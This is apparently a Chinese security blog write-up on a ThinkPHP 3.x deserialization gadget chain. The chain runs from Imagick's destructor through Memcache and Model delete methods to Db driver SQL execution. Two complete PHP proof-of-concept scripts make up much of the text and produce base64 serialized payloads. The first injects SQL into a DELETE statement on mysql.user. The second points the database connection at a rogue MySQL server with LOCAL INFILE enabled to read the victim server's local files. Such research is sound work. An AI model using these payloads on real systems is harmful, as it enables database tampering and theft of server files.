    <content type="html"><![CDATA[<p>Reference：</p><p><a href="https://mp.weixin.qq.com/s/S3Un1EM-cftFXr8hxG4qfA">https://mp.weixin.qq.com/s/S3Un1EM-cftFXr8hxG4qfA</a></p><span id="more"></span><br><h2 id="反序列化起点"><a href="#反序列化起点" class="headerlink" title="反序列化起点"></a>反序列化起点</h2><p><strong>ThinkPHP/Library/Think/Image/Driver/Imagick.class.php</strong></p><p>line 636 - line 642</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">empty</span>(<span class="keyword">$this</span>-&gt;img) || <span class="keyword">$this</span>-&gt;img-&gt;destroy();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br><p>在反序列化中，所有成员属性均可控。即 <code>$this-&gt;img</code> 可控。</p><p>如此一来，即可 <strong>无参数式</strong> 调用 TP 下任意类的 <em>destroy</em> 方法</p><br><h2 id="destroy-跳板"><a href="#destroy-跳板" class="headerlink" title="destroy()  跳板"></a>destroy()  跳板</h2><p>搜索 destroy 方法，找到三个存在 destroy 的位置：</p><img src="/2021/03/01/2021-02-28-tp3-x-sql/1.png" style="width:500px;"><p>其中两个类 <code>Think\Session\Driver\Mysqli</code>类 和 <code>Think\Session\Driver\Db</code>类  是直接调用 <em>mysqli_query</em> 进行数据库操作的，如下：</p><br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">destroy</span>(<span class="params"><span class="variable">$sessID</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="variable">$hander</span> = is_array(<span class="keyword">$this</span>-&gt;hander) ? <span class="keyword">$this</span>-&gt;hander[<span class="number">0</span>] : <span class="keyword">$this</span>-&gt;hander;</span><br><span class="line">    mysqli_query(<span class="variable">$hander</span>, <span class="string">&quot;DELETE FROM &quot;</span> . <span class="keyword">$this</span>-&gt;sessionTable . <span class="string">&quot; WHERE session_id = &#x27;<span class="subst">$sessID</span>&#x27;&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> (mysqli_affected_rows(<span class="variable">$hander</span>)) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br><p>由于 <em>mysqli_query</em> 中 <code>$hander</code> 的值取决与 <code>$this-&gt;hander</code>，但是就算我们在序列化 POC 中进行 <em>mysqli_connect</em> ，句柄移植之后是不可用的，所以这个点只能放弃。</p><br><p>这里注意下， php7 调用有参数函数时必须传参，不然会报错。但 php5 则可不传参数调用有参数函数。</p><br><p>转头看第三个类 <code>Think\Session\Driver\Memcache</code> </p><br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">destroy</span>(<span class="params"><span class="variable">$sessID</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;handle-&gt;delete(<span class="keyword">$this</span>-&gt;sessionName . <span class="variable">$sessID</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br><p>由于 <code>$this-&gt;handle</code> 可控，我们可以调用任意类的 <em>delete</em> 方法。</p><p>并且由于跳到 <em>destroy</em> 方法时是 <strong>无参数调用</strong>。这里的 <em>$sessID</em> 是个无效的形参。用这个无效的形参去调用别的函数时，传入的参数会无效。所以这里调用 <em>delete</em> 的形参还是不可控的</p><br><h2 id="Model-delete-跳板"><a href="#Model-delete-跳板" class="headerlink" title="Model delete() 跳板"></a>Model delete() 跳板</h2><p>全局搜索 <code>function delete</code>。找到 <code>Think\Model</code> 类</p><br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">delete</span>(<span class="params"><span class="variable">$options</span> = <span class="keyword">array</span>(<span class="params"></span>)</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="variable">$pk</span> = <span class="keyword">$this</span>-&gt;getPk();</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">empty</span>(<span class="variable">$options</span>) &amp;&amp; <span class="keyword">empty</span>(<span class="keyword">$this</span>-&gt;options[<span class="string">&#x27;where&#x27;</span>])) &#123;</span><br><span class="line">        <span class="comment">// 如果删除条件为空 则删除当前数据对象所对应的记录</span></span><br><span class="line">        <span class="keyword">if</span> (!<span class="keyword">empty</span>(<span class="keyword">$this</span>-&gt;data) &amp;&amp; <span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;data[<span class="variable">$pk</span>])) &#123;</span><br><span class="line">            <span class="comment">//!</span></span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;delete(<span class="keyword">$this</span>-&gt;data[<span class="variable">$pk</span>]);</span><br><span class="line">            <span class="comment">//!</span></span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">......</span><br><span class="line">    <span class="comment">// 分析表达式</span></span><br><span class="line">    <span class="variable">$options</span> = <span class="keyword">$this</span>-&gt;_parseOptions();</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">empty</span>(<span class="variable">$options</span>[<span class="string">&#x27;where&#x27;</span>])) &#123;</span><br><span class="line">        <span class="comment">// 如果条件为空 不进行删除操作 除非设置 1=1</span></span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">......    </span><br><span class="line">    <span class="variable">$result</span> = <span class="keyword">$this</span>-&gt;db-&gt;delete(<span class="variable">$options</span>);</span><br><span class="line"> ......</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br><p><code>$this-&gt;getPK()</code>函数仅仅只是 <code>return $this-&gt;pk;</code></p><p>所以 <em>$pk</em> 的值为 <em>$this-&gt;pk</em></p><br><p>可以发现在 <code>if</code> 判断中，如果传入的 <em>$options</em> 为空，则重新调用 <code>$this-&gt;delete()</code> 方法 ，并且传入的参数为 <code>$this-&gt;data[$pk]</code>。这样子 *delete()*方法的形参 <em>$options</em> 就是可控的了。</p><br><p>在<em>分析表达式</em> 流程中，重新为 <em>$options</em> 赋值，调用了 <code>$this-&gt;_parseOptions()</code>。该方法将会返回 <code>$this-&gt;options</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">protected</span> <span class="function"><span class="keyword">function</span> <span class="title">_parseOptions</span>(<span class="params"><span class="variable">$options</span> = <span class="keyword">array</span>(<span class="params"></span>)</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (is_array(<span class="variable">$options</span>)) &#123;</span><br><span class="line">        <span class="variable">$options</span> = array_merge(<span class="keyword">$this</span>-&gt;options, <span class="variable">$options</span>);</span><br><span class="line">    &#125;</span><br><span class="line">......</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$options</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br><p><em>分析表达式</em> 流程后还判断了 <em>$options[‘where’]</em> 。需要确保 <em>$options</em> 中有该值</p><br><p>程序接着调用了 <code>$this-&gt;db-&gt;delete($options)</code>，其中 <em>$this-&gt;db</em> 可控，并且 <em>$options</em> 可控，全局搜索 <code>function delete</code>。找到 <em>Think\Db\Driver</em> 类。</p><p>至于选择这个类的原因，因为它在后面构造 <em>SQL payload</em> 的时候比较方便。</p><h2 id="Driver-delete-跳板"><a href="#Driver-delete-跳板" class="headerlink" title="Driver delete() 跳板"></a>Driver delete() 跳板</h2><br><p><em>Think\Db\Driver</em> 类 <em>delete()</em> 方法主要代码如下:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$table</span> = <span class="keyword">$this</span>-&gt;parseTable(<span class="variable">$options</span>[<span class="string">&#x27;table&#x27;</span>]);</span><br><span class="line"><span class="variable">$sql</span>   = <span class="string">&#x27;DELETE FROM &#x27;</span> . <span class="variable">$table</span>;</span><br><span class="line">......</span><br><span class="line"><span class="keyword">return</span> <span class="keyword">$this</span>-&gt;execute(<span class="variable">$sql</span>, !<span class="keyword">empty</span>(<span class="variable">$options</span>[<span class="string">&#x27;fetch_sql&#x27;</span>]) ? <span class="literal">true</span> : <span class="literal">false</span>);</span><br></pre></td></tr></table></figure><br><p>可是该类为抽象类，无法直接实例化。需要找一个继承它的子类，并且该类没有 *delete()*，这样程序调用的时候才能调用到父类的 <em>delete()</em> 方法。</p><p>最终找到 <em>Think\Db\Driver\Mysql</em>类 作为反序列化的实例化类。</p><br><p><code>delete()</code>方法 最终调用了 <code>$this-&gt;execute()</code>，由于此类是专门用作数据库操作的，<code>execute()</code> 中并没有发现能 RCE 的点，也没有发现能当跳板的点。</p><p>不过注意到 <code>execute()</code> 的第一行</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">$this</span>-&gt;initConnect(<span class="literal">true</span>);</span><br></pre></td></tr></table></figure><br><p>跟进，发现当不存在 <em>$this-&gt;_linkID</em> 时，将会调用 <em>$this-&gt;connect()</em></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">......</span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">$this</span>-&gt;_linkID) &#123;</span><br><span class="line">    <span class="keyword">$this</span>-&gt;_linkID = <span class="keyword">$this</span>-&gt;connect();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br><p>跟进，发现该函数使用 <em>PDO</em> 进行数据库连接，并返回了句柄</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (!<span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;linkID[<span class="variable">$linkNum</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">empty</span>(<span class="variable">$config</span>)) &#123;</span><br><span class="line">        <span class="variable">$config</span> = <span class="keyword">$this</span>-&gt;config;</span><br><span class="line">    &#125;</span><br><span class="line">......</span><br><span class="line"><span class="keyword">$this</span>-&gt;linkID[<span class="variable">$linkNum</span>] = <span class="keyword">new</span> PDO(<span class="variable">$config</span>[<span class="string">&#x27;dsn&#x27;</span>], <span class="variable">$config</span>[<span class="string">&#x27;username&#x27;</span>], <span class="variable">$config</span>[<span class="string">&#x27;password&#x27;</span>], <span class="keyword">$this</span>-&gt;options);</span><br><span class="line">......</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="keyword">$this</span>-&gt;linkID[<span class="variable">$linkNum</span>];</span><br></pre></td></tr></table></figure><br><p>返回句柄后，<code>execute</code>方法 将会根据 <strong>传入的 sql语句</strong> 执行sql。这里 <strong>传入的sql语句</strong> 就是 <code>delete()</code>方法 中的 <code>$sql</code></p><br><h2 id="基本Payload"><a href="#基本Payload" class="headerlink" title="基本Payload"></a>基本Payload</h2><p>至此，以上整个从反序列化到执行SQL注入的流程。根据以上流程，得出基本Payload:</p><p><strong>Payload demo:</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//第三个跳板，也可以说是最终执行类</span></span><br><span class="line"><span class="comment">//由于执行类 Db 是抽象类，无法实例化</span></span><br><span class="line"><span class="comment">//遂使用其子类 Mysql进行实例化</span></span><br><span class="line"><span class="comment">//由于 payload 需要调用父类的 delete()</span></span><br><span class="line"><span class="comment">//子类必须没有 delete() 方法</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">Think</span>\<span class="title">Db</span>\<span class="title">Driver</span>&#123;</span><br><span class="line"><span class="title">class</span> <span class="title">Mysql</span>&#123;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">//第二个跳板 <span class="title">Model</span>-&gt;<span class="title">delete</span>()</span><br><span class="line"><span class="title">namespace</span> <span class="title">Think</span>&#123;</span><br><span class="line"><span class="title">class</span> <span class="title">Model</span>&#123;</span><br><span class="line">protected $pk = &#x27;exp&#x27;;</span><br><span class="line"><span class="keyword">protected</span> <span class="variable">$db</span> = <span class="literal">null</span>;</span><br><span class="line"><span class="keyword">protected</span> <span class="variable">$data</span> = <span class="keyword">array</span>();</span><br><span class="line"><span class="keyword">protected</span> <span class="variable">$options</span>   = <span class="keyword">array</span>();</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line"><span class="keyword">$this</span>-&gt;db = <span class="keyword">new</span> \Think\Db\Driver\Mysql();</span><br><span class="line"><span class="comment">//$this-&gt;pk 的值需要和 $this-&gt;data 其中一个 key值 一致</span></span><br><span class="line"><span class="keyword">$this</span>-&gt;pk = <span class="string">&#x27;x&#x27;</span>;</span><br><span class="line"><span class="comment">//$this-&gt;data 内容随意，只是过一个 if</span></span><br><span class="line"><span class="keyword">$this</span>-&gt;data = [</span><br><span class="line"><span class="string">&#x27;x&#x27;</span> =&gt; [</span><br><span class="line"><span class="string">&#x27;a&#x27;</span> =&gt; <span class="number">111</span>,</span><br><span class="line">]</span><br><span class="line">];</span><br><span class="line"><span class="keyword">$this</span>-&gt;options = [</span><br><span class="line"><span class="comment">//内容随意，也只是过一个 if</span></span><br><span class="line"><span class="string">&#x27;where&#x27;</span> =&gt; <span class="number">1</span>,</span><br><span class="line"><span class="comment">//$sql   = &#x27;DELETE FROM &#x27; . $table;</span></span><br><span class="line"><span class="comment">//SQL 注入语句</span></span><br><span class="line">                <span class="comment">//!!!注意!!!</span></span><br><span class="line">                <span class="comment">//DELETE 是高风险操作，小心谨慎</span></span><br><span class="line"><span class="string">&#x27;table&#x27;</span> =&gt; <span class="string">&#x27;mysql.user where 1=2 #&#x27;</span></span><br><span class="line">];</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//(1) 第一个跳板 Memcache-&gt;destroy()</span></span><br><span class="line"><span class="comment">//(2) 在这个方法中又调用了 $this-&gt;handle-&gt;delete($this-&gt;sessionName . $sessID);</span></span><br><span class="line"><span class="comment">//(3) sessionName 必须为空，如果为字符串传入的话，由于 $sessID 没有赋值</span></span><br><span class="line"><span class="comment">//最终调用 $this-&gt;handle-&gt;delete()时将会传入非预期值</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">Think</span>\<span class="title">Session</span>\<span class="title">Driver</span>&#123;</span><br><span class="line"><span class="title">class</span> <span class="title">Memcache</span>&#123;</span><br><span class="line"><span class="title">protected</span> $<span class="title">handle</span> = <span class="title">null</span>;</span><br><span class="line"><span class="keyword">protected</span> <span class="variable">$sessionName</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line"><span class="keyword">$this</span>-&gt;handle = <span class="keyword">new</span> \Think\Model();</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//梦开始的地方</span></span><br><span class="line"><span class="comment">//调用地一个跳板 Memcache-&gt;destroy()</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">Think</span>\<span class="title">Image</span>\<span class="title">Driver</span>&#123;</span><br><span class="line"><span class="title">class</span> <span class="title">Imagick</span>&#123;</span><br><span class="line"><span class="title">private</span> $<span class="title">img</span> = <span class="title">null</span>;</span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line"><span class="keyword">$this</span>-&gt;img = <span class="keyword">new</span> \Think\Session\Driver\Memcache();</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> &#123;</span><br><span class="line">$<span class="title">a</span> = <span class="title">new</span> \<span class="title">Think</span>\<span class="title">Image</span>\<span class="title">Driver</span>\<span class="title">Imagick</span>();</span><br><span class="line"><span class="keyword">echo</span> base64_encode(serialize(<span class="variable">$a</span>));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><br><p>开启 Debug ，追踪程序执行流程，发现 SQL 语句成功被控制</p><img src="/2021/03/01/2021-02-28-tp3-x-sql/2.png" style="width:500px;"><br><p>但是，由于我们无法知道目标服务器的 Mysql 配置，所以 SQL注入自然是跑不动的。</p><p>仔细查看数据库连接函数 <code>connect</code> 后，发现其 PDO 配置是我们可控的</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (!<span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;linkID[<span class="variable">$linkNum</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">empty</span>(<span class="variable">$config</span>)) &#123;</span><br><span class="line">        <span class="variable">$config</span> = <span class="keyword">$this</span>-&gt;config;</span><br><span class="line">    &#125;</span><br><span class="line">......</span><br><span class="line"><span class="keyword">$this</span>-&gt;linkID[<span class="variable">$linkNum</span>] = <span class="keyword">new</span> PDO(<span class="variable">$config</span>[<span class="string">&#x27;dsn&#x27;</span>], <span class="variable">$config</span>[<span class="string">&#x27;username&#x27;</span>], <span class="variable">$config</span>[<span class="string">&#x27;password&#x27;</span>], <span class="keyword">$this</span>-&gt;options);</span><br><span class="line">......</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="keyword">$this</span>-&gt;linkID[<span class="variable">$linkNum</span>];</span><br></pre></td></tr></table></figure><br><p>所以我们可以控制 tp3 连接的数据库，自然想到了 Rogue mysql server</p><p><strong>原理简单来说是这样的：</strong></p><p>mysql中有一个 SQL语句，为 LOAD DATA LOCAL INFILE。作用是将客户端本地的文件加载到数据库中。而 Rogue mysql server 可以任意读取 mysql 客户端的本地文件。</p><p>具体详情可见本博客的另一篇文章 :)</p><a href="/2021/02/08/2021-02-08-mysql-load-data/" title="Rogue Mysql Server 简单分析">Rogue Mysql Server 简单分析</a><br><p>尝试让 tp3 连接 Rogue  mysql server。修改 payload，增加数据库配置</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">Think</span>\<span class="title">Db</span>\<span class="title">Driver</span>&#123;</span><br><span class="line"><span class="title">class</span> <span class="title">Mysql</span>&#123;</span><br><span class="line">        //新增 <span class="title">mysql</span> 配置</span><br><span class="line"><span class="title">protected</span> $<span class="title">config</span> = <span class="title">array</span>(</span><br><span class="line">        &#x27;type&#x27;           =&gt; &#x27;mysql&#x27;, // 数据库类型</span><br><span class="line">        <span class="string">&#x27;hostname&#x27;</span>       =&gt; <span class="string">&#x27;192.168.92.164&#x27;</span>, <span class="comment">// 服务器地址</span></span><br><span class="line">        <span class="string">&#x27;username&#x27;</span>       =&gt; <span class="string">&#x27;root&#x27;</span>, <span class="comment">// 用户名</span></span><br><span class="line">        <span class="string">&#x27;password&#x27;</span>       =&gt; <span class="string">&#x27;123456&#x27;</span>, <span class="comment">// 密码</span></span><br><span class="line">        <span class="string">&#x27;hostport&#x27;</span>       =&gt; <span class="string">&#x27;3333&#x27;</span>, <span class="comment">// 端口</span></span><br><span class="line">    );</span><br><span class="line">    <span class="comment">//设置这个 PDO 才能 LOAD DATA LOCAL</span></span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$options</span> = <span class="keyword">array</span>(</span><br><span class="line"><span class="comment">//需要在前面加一个 \ 。不然将会报 PDO not found 的错误</span></span><br><span class="line">        \PDO::MYSQL_ATTR_LOCAL_INFILE  =&gt; <span class="literal">true</span>,</span><br><span class="line">    );</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">Think</span>&#123;</span><br><span class="line"><span class="title">class</span> <span class="title">Model</span>&#123;</span><br><span class="line">protected $pk = &#x27;exp&#x27;;</span><br><span class="line"><span class="keyword">protected</span> <span class="variable">$db</span> = <span class="literal">null</span>;</span><br><span class="line"><span class="keyword">protected</span> <span class="variable">$data</span> = <span class="keyword">array</span>();</span><br><span class="line"><span class="keyword">protected</span> <span class="variable">$options</span>   = <span class="keyword">array</span>();</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line"><span class="keyword">$this</span>-&gt;db = <span class="keyword">new</span> \Think\Db\Driver\Mysql();</span><br><span class="line"><span class="keyword">$this</span>-&gt;pk = <span class="string">&#x27;x&#x27;</span>;</span><br><span class="line"><span class="keyword">$this</span>-&gt;data = [</span><br><span class="line"><span class="string">&#x27;x&#x27;</span> =&gt; [</span><br><span class="line"><span class="string">&#x27;a&#x27;</span> =&gt; <span class="number">111</span>,</span><br><span class="line">]</span><br><span class="line">];</span><br><span class="line"><span class="keyword">$this</span>-&gt;options = [</span><br><span class="line"><span class="string">&#x27;where&#x27;</span> =&gt; <span class="number">1</span>,</span><br><span class="line">                <span class="comment">//!!!注意!!!</span></span><br><span class="line">                <span class="comment">//DELETE 是高风险操作，小心谨慎</span></span><br><span class="line"><span class="string">&#x27;table&#x27;</span> =&gt; <span class="string">&#x27;mysql.user where 1=2 #&#x27;</span></span><br><span class="line">];</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">Think</span>\<span class="title">Session</span>\<span class="title">Driver</span>&#123;</span><br><span class="line"><span class="title">class</span> <span class="title">Memcache</span>&#123;</span><br><span class="line"><span class="title">protected</span> $<span class="title">handle</span> = <span class="title">null</span>;</span><br><span class="line"><span class="keyword">protected</span> <span class="variable">$sessionName</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line"><span class="keyword">$this</span>-&gt;handle = <span class="keyword">new</span> \Think\Model();</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">Think</span>\<span class="title">Image</span>\<span class="title">Driver</span>&#123;</span><br><span class="line"><span class="title">class</span> <span class="title">Imagick</span>&#123;</span><br><span class="line"><span class="title">private</span> $<span class="title">img</span> = <span class="title">null</span>;</span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line"><span class="keyword">$this</span>-&gt;img = <span class="keyword">new</span> \Think\Session\Driver\Memcache();</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> &#123;</span><br><span class="line">$<span class="title">a</span> = <span class="title">new</span> \<span class="title">Think</span>\<span class="title">Image</span>\<span class="title">Driver</span>\<span class="title">Imagick</span>();</span><br><span class="line"><span class="keyword">echo</span> base64_encode(serialize(<span class="variable">$a</span>));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><br><p>成功读取客户端文件</p><img src="/2021/03/01/2021-02-28-tp3-x-sql/3.png" style="width:500px;"><br><p>自此文章就写到这了，本来二月十多号开始写的，中间停停写写，最后拖到现在才全部写完。。。</p><p><strong>该漏洞还可继续利用，通过 Rogue  Mysql Server 读取 tp3 的 数据库配置，再利用该配置进行 SQL注入。具体的 Reference 中写了，膜拜下奶权师傅</strong></p>]]></content>
    
    
    <summary type="html">&lt;p&gt;Reference：&lt;/p&gt;
